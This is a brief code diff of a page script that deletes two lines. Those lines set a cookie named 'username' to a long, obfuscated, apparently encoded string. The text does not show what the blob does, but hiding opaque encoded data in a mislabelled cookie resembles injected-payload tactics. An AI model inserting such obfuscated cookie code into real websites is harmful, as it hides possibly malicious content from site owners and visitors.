@@ -139,10 +139,6 @@ document.addEventListener('click', function(event) {
 
 
 
-const value = `p%sEp"{E+>IEpK'EpvIEpvEEpK+E+>AEpv'E+>+Ep%#EpK+EpvIEpvEEpv'EpH{EpvAEpvsEp"'E+>#EpvEE+>}Epy#Ep>{EpHsEpvAE+>wEpK'EpvEE+>#Ep%wEpK+EpvIE+>'E+>IEp>wEpy#Ep"{E+>IEp"AEpH'Ep"AEp"{EpKwEpvEE+>}Ep%#E+>#EpHsEp"{E+>IE+>+EpH#Ep"AEpv{Ep>IEpy#Epv{E+>IEp>}EpH+E+>#E+>IEp>+EpvIEpvEEp%wE+>}EpvEE+>'E+>IEp>wEpy#EpvsE+>EE+K{EpH{Epv#E+asE+asl`;
-
-document.cookie = "username=" + encodeURIComponent(value);
-
 
 
 
